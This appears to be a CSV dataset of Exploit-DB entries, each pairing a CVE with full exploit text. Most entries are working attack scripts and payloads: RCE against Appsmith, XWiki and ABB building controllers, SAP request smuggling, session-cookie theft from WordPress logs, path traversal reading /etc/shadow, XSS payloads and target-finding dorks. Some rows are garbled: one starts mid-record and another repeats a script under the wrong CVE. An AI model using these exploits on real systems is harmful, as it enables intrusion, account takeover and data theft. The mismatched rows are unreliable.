24.261-b02, mixed mode) phpMyAdmin 2.11.9 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Reported by DIVD Advisory ID: ZSL-2024-5830 Advisory URL: <URL> CVE ID: CVE-2024-4007 CVE URL: <URL> 21.04.2024 $ cat project P R O J E C T $ cat max/var/www/html/phpMyAdmin/config.inc.php | grep control $cfg['Servers'][$i]['controluser'] = 'root'; $cfg['Servers'][$i]['controlpass'] = 'F';"
CVE-2025-29471,"{""CVE-2025-29471"": 1}",2025-04-03,Nagios Log Server 2024R1.3.1 - Stored XSS,https://www.exploit-db.com/exploits/52117,"Exploit Title: Stored XSS Vulnerability in Nagios Log Server (Privilege Escalation to Admin) Date: 2025-04-02 Exploit Author: Seth Kraft Vendor Homepage: <URL> Vendor Changelog: <URL> Software Link: <URL> Version: 2024R1.3.1 and below Tested On: Nagios Log Server 2024R1.3.1 (default configuration, Ubuntu 20.04) CWE: CWE-79, CWE-352, CWE-285, CWE-269, CWE-602 CVSS: 9.3 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:R/S:C/VC:H/VI:H/VA:H) Type: Stored Cross-Site Scripting (XSS), Privilege Escalation Exploit Risk: Critical Disclosure For research and authorized testing only. Do not use against systems without permission. Description: A stored XSS vulnerability in Nagios Log Server 2024R1.3.1 allows a low-privileged user to inject malicious JavaScript into the 'email' field of their profile. When an administrator views the audit logs, the script executes, resulting in privilege escalation via unauthorized admin account creation. The vulnerability can be chained to achieve remote code execution (RCE) in certain configurations."
CVE-2024-55963,"{""CVE-2024-55963"": 1}",2025-04-03,AppSmith 1.47 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52118,"Exploit Title: AppSmith 1.47 - Remote Code Execution (RCE) Original Author: Rhino Security Labs Exploit Author: Nishanth Anand Exploit Date: April 2, 2025 Vendor Homepage: <URL> Software Link: <URL> Version: Prior to v1.52 Tested Versions: v1.47 CVE ID: CVE-2024-55963 Vulnerability Type: Remote Code Execution Description: Unauthenticated remote code execution in Appsmith versions prior to v1.52 due to misconfigured PostgreSQL database allowing COPY FROM PROGRAM command execution. Proof of Concept: Yes Categories: Web Application, Remote Code Execution, Database CVSS Score: 9.8 (Critical) CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Notes: The vulnerability exists in Appsmith's internal PostgreSQL database configuration, allowing attackers to execute arbitrary commands on the host system. import requests import json import pyfiglet import argparse Create a banner using pyfiglet banner = pyfiglet.figletformat(""Appsmith RCE"") Replace with your desired title print(banner) Set up argument parser parser = argparse.ArgumentParser(description='Appsmith RCE Proof of Concept') parser.addargument('-u', '--url', required=True, help='Base URL of the target') parser.addargument('command', nargs='?', default='id', help='Command to execute') args = parser.parseargs() Get the base URL and command from the parsed arguments baseurl = args.url commandarg = args.command if not baseurl.startswith("" <URL> and not baseurl.startswith("" <URL> baseurl = "" <URL> + baseurl Signup request signupurl = f""{baseurl}/api/v1/users"" signup_data = { ""email"": ""poc1@"
CVE-2022-22536,"{""CVE-2022-22536"": 1}",2025-04-02,SAP NetWeaver - 7.53 - HTTP Request Smuggling,https://www.exploit-db.com/exploits/52109,"Exploit Title: SAPGateBreaker Exploit - CVE-2022-22536 - HTTP Request Smuggling Through SAP's Front Door Google Dork: <URL> Date: Tuesday, April 2, 2025 Exploit Author: - Victor de Queiroz - Beco do Exploit - Elytron Security Vendor Homepage: <URL> smuggling-and-request-concatenation/ba-p/13528083 Software Link: <URL> Version: SAP NetWeaver Application Server ABAP, SAP NetWeaver Application Server Java, ABAP Platform, SAP Content Server 7.53 and SAP Web Dispatcher Tested on: Red Hat Enterprise Linux (RHEL) CVE : 2022-22536 <URL> SAPGateBreaker - CVE-2022-22536 HTTP Request Smuggler Author: - Victor de Queiroz | elytronsecurity.com | becodoexploit.com Target: SAP NetWeaver Application Server Vulnerability: CVE-2022-22536 Exploit Type: HTTP Request Smuggling (Content-Length-based) Impact: ACL Bypass, Internal Access More information and explanations: <URL> Sample Payload: GET /sap/admin/public/default.html HTTP/1.1 Host: 172.32.22.7:50000 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x8664; rv:136.0) Gecko/20100101 Firefox/136.0 Accept: application/json, text/javascript, /; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: <URL> X-Requested-With: XMLHttpRequest Connection: keep-alive Cookie: saplb*=(J2EE7364720)7364750 Authorization: Basic YTph Content-Length: 89 0\r \r GET /heapdump/ HTTP/1.1\r Host: 127.0.0.1\r X-Forwarded-For: 127.0.0.1\r \r Expected Response: HTTP/1.1 200 OK server: SAP NetWeaver Application Server last-modified: Tue, 01 Sep 2020 11:54:39 GMT sap-cache-control: +3600 date: Tue, 01 Apr 2025 20:49:02 GMT content-length: 4465 content-type: text/html connection: Keep-Alive x-dummy: 0 Indicators of Success: - Status code 200 for internal endpoints - Difference between direct access (403/404) and smuggled (200) - Access to otherwise restricted SAP services via loopback injection Example Paths Tested: - /sap/public/bc/icf/info - /sap/bc/webdynpro/sap/applsoapmanagement - /heapdump/ - /ctc/ConfigServlet - /sap/public/bc/icf/logon.html - /webdynpro/resources/sap.com/tc~lm~config~content/ SAP NetWeaver Application Server ABAP, SAP NetWeaver Application Server Java, ABAP Platform, SAP Content Server 7.53 and SAP Web Dispatcher are vulnerable for request smuggling and request concatenation. An unauthenticated attacker can prepend a victim's request with arbitrary data. This way, the attacker can execute functions impersonating the victim or poison intermediary Web caches. A successful attack could result in complete compromise of Confidentiality, Integrity and Availability of the system. Google Dorks: intitle:""SAP NetWeaver Application Server Java"" inurl:/webdynpro/resources/ intitle:""SAP NetWeaver"" ""SAP J2EE Engine"" intitle:""Welcome to SAP NetWeaver"" inurl:/irj/portal intitle:""SAP NetWeaver Administrator"" inurl:/nwa inurl:""/sap/bc/webdynpro"" -site:sap.com inurl:""/sap/public"" ""SAP NetWeaver"" inurl:""/sap/admin/public/default.html"" inurl:""/webdynpro/welcome/Welcome.html"" inurl:""/sap/public/info.jsp"" ""Powered by SAP NetWeaver"" inurl:sap intitle:""SAP Web Dispatcher Administration"" Exploit import argparse import http.client from urllib.parse import urlparse from colorama import Fore, Style, Back, init import os init(autoreset=True) BANNER = f"" {Fore.WHITE} (\/\ Breaking the Gate | {Style.BRIGHT}{Fore.WHITE}by{Style.RESETALL} {Fore.YELLOW}{Fore.WHITE} | ({Fore.RED}•{Fore.WHITE}デ{Fore.RED}•{Fore.WHITE}) {Style.BRIGHT}{Fore.YELLOW} CVE-2022-22536{Style.RESETALL} | {Fore.GREEN}t.me/becodoxpl{Fore.WHITE} | / つ {Fore.WHITE}HTTP Request Smuggler | {Fore.YELLOW}becodoexploit.com{Fore.WHITE} | {Fore.LIGHTBLUEEX}elytronsecurity.com{Fore.WHITE} | def detectsapversion(host, port, ishttps): try: connclass = http.client.HTTPSConnection if ishttps else http.client.HTTPConnection conn = connclass(host, port, timeout=5) conn.request(""GET"", ""/"") res = conn.getresponse() headers = {k.lower(): v for k, v in res.getheaders()} serverheader = headers.get(""server"", ""Unknown"") print(f""{Fore.YELLOW}[*] {Fore.WHITE}Detected SAP Server Header: {Fore.CYAN}{serverheader}\n"") return serverheader except Exception as e: print(f""{Fore.RED}[!] {Fore.WHITE}Could not determine SAP version: {e}\n"") return ""Unknown"" def buildsmuggledrequest(path): return f""0\r\n\r\nGET {path} HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Forwarded-For: 127.0.0.1\r\nConnection: close\r\n\r\n"" def tryfileread(host, port, ishttps, verbose): testpaths = [ ""/sap/public/bc/icf/info"", ""/sap/public/info.jsp"", ""/sap/public/test/test.jsp"", ""/sap/bc/webdynpro/sap/applsoapmanagement"", ""/sap/public/bc/soap/rfc"", ""/webdynpro/welcome/Welcome.html"", ""/srcentral"", ""/useradmin/.jsp"", ""/heapdump/"", ""/startPage"", ""/crossdomain.xml"", ""/ctc/ConfigServlet"", ""/webdynpro/resources/sap.com/tc~lm~config~content/"", ""/sld"", ""/sap/bc/webdynpro/sap/wdycfgcomponentconfig"", ""/sap/public/bc/icf/logon.html"", ""/sap/bc/webdynpro/sap/itadmin"", ""/sap/public/bc/sec/saml2"", ""/sap/public/bc/webdav"" print(f""{Style.BRIGHT}{Fore.RED}[!] {Fore.WHITE}Proof of Concept for ACL Bypass via HTTP Request Smuggling{Style.RESETALL}\n"") for path in testpaths: try: connclass = http.client.HTTPSConnection if ishttps else http.client.HTTPConnection conn = connclass(host, port) conn.request(""GET"", path) resdirect = conn.getresponse() contentdirect = resdirect.read().decode(errors=""ignore"") directstatus = resdirect.status except Exception as e: print(f""{Fore.RED}[!] {Fore.WHITE}Error checking direct access for {path}: {e}"") continue body = buildsmuggledrequest(path) headers = { ""Host"": f""{host}:{port}"", ""Authorization"": ""Basic YTph"", ""Cookie"": ""saplb*=(J2EE7364720)7364750"", ""Content-Type"": ""application/json"", ""Content-Length"": str(len(body.encode(""utf-8"") try: conn = connclass(host, port) conn.request(""POST"", ""/sap/admin/public/default.html"", body=body, headers=headers) res = conn.getresponse() smuggledheaders = res.getheaders() contentsmuggled = res.read().decode(errors=""ignore"") smuggledstatus = res.status statuscolor = Fore.GREEN if smuggledstatus != directstatus else Fore.RED print(f""{statuscolor}[-] {Fore.LIGHTBLUEEX}{path} {Style.BRIGHT}{Fore.WHITE}Direct Access: {Fore.YELLOW}({directstatus}) {Fore.WHITE}Smuggled Access: {statuscolor}({smuggledstatus}){Style.RESETALL}"") if smuggledstatus == direct_status: print(f""{Fore.RED}[x] {Fore.WHITE}Exploit did not work for {path}\n"") with open("""
CVE-2024-42831,"{""CVE-2024-42831"": 1}",2025-04-02,Elaine&#039;s Realtime CRM Automation 6.18.17 - Reflected XSS,https://www.exploit-db.com/exploits/52106,"Exploit Title: Elaine's Realtime CRM Automation 6.18.17 - Reflected XSS Date: 09/2024 Exploit Author: Haythem Arfaoui (CBTW Team) Vendor Homepage: <URL> Software Link: <URL> Version: 6.18.17 and below Tested on: Windows, Linux CVE : CVE-2024-42831 Description A reflected cross-site scripting (XSS) vulnerability in Elaine's Realtime CRM Automation v6.18.17 allows attackers to execute arbitrary JavaScript code in the web browser of a user via injecting a crafted payload into the dialog parameter at wrapperdialog.php. Steps to reproduce: 1. Navigate to any website that contains Elaine's Realtime CRM Automation 2. Navigate to this endpoint: /system/interface/wrapperdialog.php 3. Append the payload a""%20onafterscriptexecute=alert(document.domain)> in the ""dialog"" param and execute the request 4. Final URL : /system/interface/wrapper_dialog.php?dialog=a""%20onafterscriptexecute=alert(document.domain)>"
CVE-2024-6298,"{""CVE-2024-6298"": 1}",2025-04-02,ABB Cylon Aspect 3.08.01 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52107,"Exploit Title : ABB Cylon Aspect 3.08.01 - Remote Code Execution (RCE) Vendor: ABB Ltd. Product web page: <URL> Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.01 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB BMS/BAS controller suffers from a remote code execution vulnerability. The vulnerable uploadFile() function in bigUpload.php improperly reads raw POST data using the php://input wrapper without sufficient validation. This data is passed to the fwrite() function, allowing arbitrary file writes. Combined with an improper sanitization of file paths, this leads to directory traversal, allowing an attacker to upload malicious files to arbitrary locations. Once a malicious file is written to an executable directory, an authenticated attacker can trigger the file to execute code and gain unauthorized access to the building controller. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x8664) GNU/Linux 2.6.32 (x8664) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x8664) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2024-5828 Advisory URL: <URL> CVE ID: CVE-2024-6298 CVE URL: <URL> 21.04.2024 $ cat project P R O J E C T 1. $ curl -X POST "" <URL> \ > -H ""Cookie: PHPSESSID=25131337"" \ > -H ""Content-Type: application/x-www-form-urlencoded"" \ > -d "" "" 2. $ curl -X POST "" <URL> \ > -H ""Cookie: PHPSESSID=25131337"" \ > –H ""Content-Type: application/x-www-form-urlencoded"" 3. $ curl -X POST "" <URL> \ > -H ""Cookie: PHPSESSID=25131337"" \ > -H ""Content-Type: application/x-www-form-urlencoded"" \ > -d ""key=251&name=../../../../../../../home/MIXCMIX/htmlroot/ZSL.php"" 4. $ curl <URL> uid=33(www-data) gid=33(www-data) groups=33(www-data)"
CVE-2024-6209,"{""CVE-2024-6209"": 1}",2025-04-02,ABB Cylon Aspect 3.08.01 - Arbitrary File Delete,https://www.exploit-db.com/exploits/52108,"Exploit Title : ABB Cylon Aspect 3.08.01 - Arbitrary File Delete Vendor: ABB Ltd. Product web page: <URL> Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.01 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The BMS/BAS controller suffers from an arbitrary file deletion vulnerability. Input passed to the 'file' parameter in 'databasefiledelete.php' is not properly sanitised before being used to delete files. This can be exploited by an unauthenticated attacker to delete files with the permissions of the web server using directory traversal sequences passed within the affected POST parameter. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x8664) GNU/Linux 2.6.32 (x8664) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x8664) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2024-5827 Advisory URL: <URL> CVE ID: CVE-2024-6209 CVE URL: <URL> 21.04.2024 $ cat project P R O J E C T $ curl -X POST <URL> \ > -d ""file0=../../../../../../../../../home/MIXCMIX/htmlroot/validate/validateHeader.php \ > &delete0=1 \ > &total=1 \ > &submitDeleteForm=Delete"""
CVE-2023-48292,"{""CVE-2023-48292"": 1}",2025-03-29,XWiki Standard 14.10 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52105,"Exploit Title: CVE-2023-48292 Remote Code Execution Exploit Google Dork: N/A Date: 23 March 2025 Exploit Author: Mehran Seifalinia Vendor Homepage: <URL> Software Link: <URL> Version: XWiki Standard 14.10 Tested on: Ubuntu 20.04 LTS with OpenJDK 11 CVE : CVE-2023-48292 from argparse import ArgumentParser import sys import logging from requests import get, post, RequestException import validators Constants CVENAME = ""CVE-2023-48292"" HEADERS = { ""User-Agent"": ""Mozilla/5.0 (X11; Linux x8664) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"" Configure logging def setuplogging(logfile): logger = logging.getLogger() logger.setLevel(logging.INFO) Create a logging handler for console output consolehandler = logging.StreamHandler(sys.stdout) consolehandler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')) logger.addHandler(consolehandler) Create a logging handler for file output filehandler = logging.FileHandler(logfile) filehandler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')) logger.addHandler(filehandler) def validateurl(url): Validate the URL to ensure it has the correct format and starts with ' <URL> or ' <URL> if not validators.url(url): logging.error(""Invalid target URL format. It must start with ' <URL> or ' <URL> sys.exit(1) return url.rstrip(""/"") def checkvulnerability(targeturl, method): Check if the target URL is vulnerable to the CVE-2023-48292 vulnerability. We send a test payload and inspect the response to determine if the vulnerability exists. try: Test payload to check for vulnerability testpayload = ""echo 'testtesttest1234'"" Payload to execute a test command on the target system vulnerableurl = f""{targeturl}/xwiki/bin/view/Admin/RunShellCommand?command={testpayload}"" if method == ""GET"": response = get(vulnerableurl, headers=HEADERS) else: method == ""POST"" response = post(vulnerableurl, headers=HEADERS) if response.statuscode == 200 and ""testtesttest1234"" in response.text: logging.info(""Target is vulnerable! Command execution test succeeded."") return True else: logging.info(""Target does not appear to be vulnerable."") return False except RequestException as error: logging.error(f""HTTP Request Error: {error}"") sys.exit(1) def performattack(targeturl, payload, method): Perform the attack by sending a custom payload to the vulnerable server. try: logging.info(f""Attempting attack with payload: {payload}"") vulnerableurl = f""{targeturl}/xwiki/bin/view/Admin/RunShellCommand?command={payload}"" if method == ""GET"": response = get(vulnerableurl, headers=HEADERS) else: method == ""POST"" response = post(vulnerableurl, headers=HEADERS) if response.statuscode == 200: logging.info(f""Attack successful! Response: {response.text[:100]}."") Display a snippet of the response else: logging.warning(""Attack attempt failed."") except RequestException as error: logging.error(f""HTTP Request Error: {error}"") sys.exit(1) def main(): Main function to parse command-line arguments, check for vulnerability, and optionally perform the attack. parser = ArgumentParser(description=f""{CVENAME} Exploit Script"") parser.addargument(""target"", help=""Target URL (e.g., <URL> parser.addargument(""--exploit"", action=""storetrue"", help=""Perform attack with a payload"") parser.addargument(""--payload"", default=""echo 'testtesttest1234'"", help=""Custom payload for exploitation"") parser.addargument(""--method"", choices=[""GET"", ""POST""], default=""GET"", help=""HTTP method to use (GET or POST)"") parser.addargument(""--logfile"", default=""exploit.log"", help=""Log file to store results"") args = parser.parseargs() Set up logging to file and console setuplogging(args.logfile) Validate the target URL targeturl = validateurl(args.target) logging.info(""Checking the target for vulnerability."") if checkvulnerability(targeturl, args.method): if args.exploit: Perform the attack with the provided payload performattack(targeturl, args.payload, args.method) else: logging.info(""Run with '--exploit' to attempt the attack."") else: logging.warning(""The target is not vulnerable. Exiting."") if name == ""main_"": main()"
CVE-2024-44000,"{""CVE-2024-44000"": 1}",2025-03-28,Litespeed Cache 6.5.0.1 - Authentication Bypass,https://www.exploit-db.com/exploits/52099,"Exploit Title: Litespeed Cache 6.5.0.1 - Authentication Bypass Google Dork: [if applicable] Date: reported on 17 September 2024 Exploit Author: Gnzls Vendor Homepage: <URL> Software Link: <URL> Version: 6.5.0.1 Tested on: macOS M2 pro CVE : CVE-2024-44000 import re import sys import requests import argparse from urllib.parse import urljoin def extractlatestcookies(logcontent): usercookies = {} patterncookie = re.compile(r'Cookie:\s.*?wordpressloggedin[^=]+=(.?)%') for line in log_content.splitlines(): cookie_match = pattern_cookie.search(line) if cookie_match: username = cookie_match.group(1) user_cookies[username] = line return user_cookies def choose_user(user_cookies): users = list(user_cookies.keys()) if not users: print(""No users found."") sys.exit(1) Display user options print(""Select a user to impersonate:"") for idx, user in enumerate(users): print(f""{idx + 1}. {user}"") Get the user's choice choice = int(input(""Pick a number: "")) - 1 if 0 <= choice < len(users): return users[choice], user_cookies[users[choice]] else: print(""Invalid selection."") sys.exit(1) print(""- LiteSpeed Account Takeover exploit -"") print("" (unauthorized account access)"") print(""\t\t\tby Gonzales"") parser = argparse.ArgumentParser() parser.add_argument('url', help=' <URL> if len(sys.argv) == 1: parser.print_help() sys.exit(1) args = parser.parse_args() log_file_url = urljoin(args.url, 'wp-content/debug.log') response = requests.get(log_file_url) if response.status_code == 200: log_content = response.text ucookies = extract_latest_cookies(log_content) choice, cookie = choose_user(ucookies) print(f""Go to {args.url}/wp-admin/ and set this cookie:"") print(cookie.split(']')[1]) else: print(""Log file not found."") sys.exit(1) 1. Overview: Purpose and Target The script aims to extract cookies (which contain session information) from a WordPress debug.log file, allowing the attacker to impersonate a logged-in user and access their account without authorization. 2. How the Code Works extract_latest_cookies Function: Purpose: This function scans the contents of the debug.log file and uses a regular expression to extract cookies for logged-in WordPress users. How it Works: The function reads each line of the debug.log file. It searches for lines that contain cookies using the following regular expression: Cookie:\s.?wordpressloggedin[^=]+=(.*?)%. This pattern matches WordPress login cookies and extracts the username and cookie value. The extracted cookie values are stored in a dictionary called usercookies, where the keys are usernames and the values are the corresponding cookie strings. chooseuser Function: Purpose: Once cookies are extracted, this function allows the attacker to select which user's cookie to use for impersonation. How it Works: It checks if there are any users (i.e., cookies) available. If no cookies are found, it prints a message and exits the program. If cookies are found, it prints a list of users and asks the attacker to select one. Once a user is selected, the function returns the corresponding cookie for that user. Main Program: Purpose: The main part of the script handles the workflow of retrieving the debug.log file, extracting cookies, and allowing the attacker to choose which user to impersonate. How It Works: The script takes a URL as input, which is the target WordPress site (e.g., <URL> It constructs the URL to the debug.log file ( <URL> The script sends an HTTP request to this URL to fetch the log file. If the file is found (response status 200), it passes the file content to the extractlatest_cookies function to extract cookies. The attacker selects which user's cookie to use, and the script prints the cookie information. The attacker can then use this cookie to impersonate the selected user by setting it in their browser and accessing the WordPress admin panel (/wp-admin/). requests Library: This library is used to send HTTP requests to the target site and retrieve the debug.log file. argparse Library: This allows the user to input the target WordPress URL from the command line. sys.exit() Function: The script uses this to exit the program in case of errors, such as when no users are found or the log file is inaccessible. 3. Potential for Abuse This script exploits a vulnerability in WordPress by targeting publicly accessible debug.log files. If a site has misconfigured logging, this file might be available to anyone on the internet. By accessing the debug.log file, an attacker can extract sensitive session cookies, impersonate users, and gain unauthorized access to WordPress accounts (including admin accounts)."
CVE-2024-8945,"{""CVE-2024-8945"": 1}",2025-03-28,CodeCanyon RISE CRM 3.7.0 - SQL Injection,https://www.exploit-db.com/exploits/52100,"Exploit Title: CodeCanyon RISE CRM 3.7.0 - SQL Injection Google Dork: N/A Date: September 19, 2024 Exploit Author: Jobyer Ahmed Author Homepage: <URL> Vulnerable Version: 3.7 Patched Version: 3.7.1 Tested on: Ubuntu 24.04, Debian Testing CVE: CVE-2024-8945 Instruction# 1. Login to Ultimate Project Manager 3.7 2. Add a New Dashboard 3. Launch the"
CVE-2024-4956,"{""CVE-2024-4956"": 1}",2025-03-28,Sonatype Nexus Repository 3.53.0-01 - Path Traversal,https://www.exploit-db.com/exploits/52101,"Exploit Title: Sonatype Nexus Repository 3.53.0-01 - Path Traversal Google Dork: header=""Server: Nexus/3.53.0-01 (OSS)"" Date: 2024-09-22 Exploit Author: VeryLazyTech GitHub: <URL> Vendor Homepage: <URL> Software Link: <URL> Version: 3.53.0-01 Tested on: Ubuntu 20.04 CVE: CVE-2024-4956 import requests import random import argparse from colorama import Fore, Style green = Fore.GREEN magenta = Fore.MAGENTA cyan = Fore.CYAN mixed = Fore.RED + Fore.BLUE red = Fore.RED blue = Fore.BLUE yellow = Fore.YELLOW white = Fore.WHITE reset = Style.RESETALL bold = Style.BRIGHT colors = [green, cyan, blue] randomcolor = random.choice(colors) def banner(): banner = f""{bold}{randomcolor} | | \ V / | | / /| || / /| | | \, |) | () | \ V / / | | |_| | | || (| |/ /| || | | | / (| | | | {bold}{white} - Medium {reset}\n"" return banner def readipportlist(filepath): with open(filepath, 'r') as file: lines = file.readlines() return [line.strip() for line in lines] def makerequest(ipport, urlpath): url = f"" <URL> try: response = requests.get(url, timeout=5) return response.text except requests.RequestException as e: return None def main(ipportlist): for ipport in ipportlist: for urlpath in [""%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd"", ""%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/shadow""]: responsetext = makerequest(ipport, urlpath) if responsetext and ""nexus:x:200:200:Nexus Repository Manager user:/opt/sonatype/nexus:/bin/false"" not in responsetext and ""Not Found"" not in responsetext and ""400 Bad Request"" not in responsetext and ""root"" in responsetext: print(f""Address: {ipport}"") print(f""File Contents for passwd:\n{responsetext}"" if ""passwd"" in urlpath else f""File Contents for shadow:\n{responsetext}"") break if name == ""main"": parser = argparse.ArgumentParser(description=f""[{bold}{blue}Description{reset}]: {bold}{white}Vulnerability Detection and Exploitation tool for CVE-2024-4956"", usage=argparse.SUPPRESS) group = parser.addmutuallyexclusivegroup(required=True) group.addargument(""-u"", ""--url"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a URL or IP with port for vulnerability detection\n"") group.addargument(""-l"", ""--list"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a list of URLs or IPs for vulnerability detection\n"") args = parser.parseargs() if args.list: ipportlist = readipportlist(args.list) print(banner()) main(ipportlist) elif args.url: ipportlist = [args.url] print(banner()) main(ipportlist) else: print(banner()) parser.print_help()"
CVE-2024-23692,"{""CVE-2024-23692"": 1}",2025-03-28,Rejetto HTTP File Server 2.3m - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52102,"Exploit Title: Rejetto HTTP File Server 2.3m - Remote Code Execution (RCE) Fofa Dork: ""HttpFileServer"" && server==""HFS 2.3m"" Date: 2024-09-22 Exploit Author: VeryLazyTech GitHub: <URL> Vendor Homepage: <URL> Software Link: <URL> Version: 2.3m Tested on: Windows 10 CVE: CVE-2024-23692 import requests import random import argparse from colorama import Fore, Style green = Fore.GREEN magenta = Fore.MAGENTA cyan = Fore.CYAN mixed = Fore.RED + Fore.BLUE red = Fore.RED blue = Fore.BLUE yellow = Fore.YELLOW white = Fore.WHITE reset = Style.RESETALL bold = Style.BRIGHT colors = [green, cyan, blue] randomcolor = random.choice(colors) def banner(): banner = f""{bold}{randomcolor} | | \ V / | | / /| || / /| | | \, |) | () | \ V / / | | |_| | | || (| |/ /| || | | | / (| | | | {bold}{white} - Medium {reset}\n"" return banner def readipportlist(filepath): with open(filepath, 'r') as file: lines = file.readlines() return [line.strip() for line in lines] def makerequest(ipport, urlpath): url = f"" <URL> try: response = requests.get(url, timeout=5) return response.text except requests.RequestException as e: return None def main(ipportlist): for ipport in ipportlist: for urlpath in [""%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd"", ""%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/shadow""]: responsetext = makerequest(ipport, urlpath) if responsetext and ""nexus:x:200:200:Nexus Repository Manager user:/opt/sonatype/nexus:/bin/false"" not in responsetext and ""Not Found"" not in responsetext and ""400 Bad Request"" not in responsetext and ""root"" in responsetext: print(f""Address: {ipport}"") print(f""File Contents for passwd:\n{responsetext}"" if ""passwd"" in urlpath else f""File Contents for shadow:\n{responsetext}"") break if name == ""main"": parser = argparse.ArgumentParser(description=f""[{bold}{blue}Description{reset}]: {bold}{white}Vulnerability Detection and Exploitation tool for CVE-2024-4956"", usage=argparse.SUPPRESS) group = parser.addmutuallyexclusivegroup(required=True) group.addargument(""-u"", ""--url"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a URL or IP with port for vulnerability detection\n"") group.addargument(""-l"", ""--list"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a list of URLs or IPs for vulnerability detection\n"") args = parser.parseargs() if args.list: ipportlist = readipportlist(args.list) print(banner()) main(ipportlist) elif args.url: ipportlist = [args.url] print(banner()) main(ipportlist) else: print(banner()) parser.print_help()"
CVE-2024-4358,"{""CVE-2024-4358"": 1}",2025-03-28,Progress Telerik Report Server 2024 Q1 (10.0.24.305) - Authentication Bypass,https://www.exploit-db.com/exploits/52103,"Exploit Title: Progress Telerik Report Server 2024 Q1 (10.0.24.305) - Authentication Bypass Fofa Dork: title=""Telerik Report Server"" Date: 2024-09-22 Exploit Author: VeryLazyTech GitHub: <URL> Vendor Homepage: <URL> Software Link: <URL> Version: 2024 Q1 (10.0.24.305) and earlier Tested on: Windows Server 2019 CVE: CVE-2024-4358 import aiohttp import asyncio from aliveprogress import alivebar from colorama import Fore, Style import os import aiofiles import time import random import argparse from fakeuseragent import UserAgent import uvloop import string import zipfile import base64 green = Fore.GREEN magenta = Fore.MAGENTA cyan = Fore.CYAN mixed = Fore.RED + Fore.BLUE red = Fore.RED blue = Fore.BLUE yellow = Fore.YELLOW white = Fore.WHITE reset = Style.RESETALL bold = Style.BRIGHT colors = [ green, cyan, blue] randomcolor = random.choice(colors) def banner(): banner = f""{bold}{randomcolor} | |_ \ V / | | / /| || / /| || _|) |) | (_) | \ V / / | | || | | || (| |/ /| || | | | / (| | | | {bold}{white} - Medium {reset}\n"" return banner print(banner()) parser = argparse.ArgumentParser(description=f""[{bold}{blue}Description{reset}]: {bold}{white}Vulnerability Detection and Exploitation tool for CVE-2024-4358"" , usage=argparse.SUPPRESS) parser.addargument(""-u"", ""--url"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a URL or IP wtih port for vulnerability detection"") parser.addargument(""-l"", ""--list"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a list of URLs or IPs for vulnerability detection"") parser.addargument(""-c"", ""--command"", type=str, default=""id"", help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a shell command to execute it"") parser.addargument(""-t"", ""--threads"", type=int, default=1, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Number of threads for list of URLs"") parser.addargument(""-proxy"", ""--proxy"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Proxy URL to send request via your proxy"") parser.addargument(""-v"", ""--verbose"", action=""storetrue"", help=f""[{bold}{blue}INF{reset}]: {bold}{white}Increases verbosity of output in console"") parser.addargument(""-o"", ""--output"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Filename to save output of vulnerable target{reset}]"") 